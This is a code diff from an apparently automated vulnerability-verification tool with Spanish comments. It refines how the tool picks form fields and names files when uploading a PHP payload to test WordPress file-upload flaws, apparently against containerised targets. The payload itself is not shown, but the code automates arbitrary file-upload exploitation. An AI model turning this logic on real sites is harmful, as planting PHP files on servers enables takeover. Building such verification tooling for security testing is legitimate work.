@@ -136,6 +136,10 @@ _XML_HINTS = ("xml", "feed", "data", "content", "body", "payload", "import")
 _REDIRECT_HINTS = ("redirect", "url", "return", "next", "target", "dest", "destination",
                    "continue", "go", "out", "location")
 _FILE_UPLOAD_HINTS = ("file", "upload", "avatar", "image", "attachment", "document", "photo")
+# Suffixes that signal the BINARY upload field vs the filename/path hint field
+# e.g. "file_url" > "file_name" — checked after the basic hints
+_UPLOAD_BINARY_SUFFIXES  = ("_url", "_content", "_data", "_binary", "_body", "_stream")
+_UPLOAD_NAME_SUFFIXES    = ("_name", "_filename", "_path")
 _SERIAL_HINTS = ("data", "payload", "value", "options", "settings", "meta", "object", "serialized")
 
 
@@ -182,15 +186,32 @@ def _docker_daemon_ok(timeout: float = 8.0) -> bool:
 
 def _pick_param(params, hints) -> Optional[str]:
     """Elige el nombre de parametro mas probable para un rol (id/email/password) entre los que
-    cito el LLM, por coincidencia de substring contra una lista de pistas ordenada por prioridad."""
+    cito el LLM, por coincidencia de substring contra una lista de pistas ordenada por prioridad.
+
+    Desempate para campos de subida de fichero: cuando varios params coinciden con la misma pista,
+    prefiere el que termina en un sufijo binario (_url, _content, _data...) sobre el que termina
+    en un sufijo de nombre (_name, _filename, _path), porque en muchos PoCs el campo binario se
+    llama file_url y el campo de nombre se llama file_name -- y el motor necesita subir el
+    contenido PHP al campo binario, no al de nombre.
+    """
     if not params:
         return None
     names = list(params.keys()) if isinstance(params, dict) else list(params)
     low = {n: n.lower() for n in names}
     for h in hints:
-        for n, l in low.items():
-            if h in l:
-                return n
+        # Collect all params that match this hint
+        matches = [n for n, l in low.items() if h in l]
+        if not matches:
+            continue
+        if len(matches) == 1:
+            return matches[0]
+        # Prefer binary-upload suffix over name/path suffix
+        binary = [n for n in matches if any(low[n].endswith(s) for s in _UPLOAD_BINARY_SUFFIXES)]
+        if binary:
+            return binary[0]
+        # Avoid _name/_filename/_path params when better alternatives exist
+        non_name = [n for n in matches if not any(low[n].endswith(s) for s in _UPLOAD_NAME_SUFFIXES)]
+        return (non_name or matches)[0]
     return None
 
 
@@ -8842,6 +8863,16 @@ def verify_wordpress_file_upload(
             extra_nonce_pages=extra_nonce_pages)
         other_params = {k: v for k, v in base_params.items() if k != file_param}
 
+        # When upload field is a *_url param, the companion *_name param carries the filename.
+        # Pass it automatically with the actual filename so the server saves the right extension.
+        _companion_name_param = ""
+        if file_param and any(file_param.endswith(s) for s in _UPLOAD_BINARY_SUFFIXES):
+            _prefix = file_param[:file_param.rfind("_")]
+            for _np in (_prefix + "_name", _prefix + "_filename", "file_name", "filename"):
+                if _np in other_params or _np in (parameters or []):
+                    _companion_name_param = _np
+                    break
+
         # ── Resolución de form_id para plugins con campo de subida anidado ───────────────────
         # Cuando file_field_tpl o extra_upload_data contienen {form_id}, lo resolvemos aquí
         # una vez (scrape de la pagina del shortcode → wp-cli CPT → wp eval create).
@@ -8927,10 +8958,12 @@ def verify_wordpress_file_upload(
                 for k, v in _extra_upload_resolved.items()
             }
             _sess_to_use = _attack_sess if _attack_sess is not None else boot.sub_sess
+            # If companion name param found (e.g. file_name), inject fname into form data
+            _name_inject = {_companion_name_param: fname} if _companion_name_param else {}
             try:
                 resp = _sess_to_use.request(
                     m, boot.base_url + endpoint,
-                    data={**other_params, **_extra_per_attempt},
+                    data={**other_params, **_extra_per_attempt, **_name_inject},
                     files={_actual_file_field: (fname, php_payload, content_type)}, timeout=20)
             except Exception as e:
                 tried.append({"filename": fname, "error_subida": str(e)})
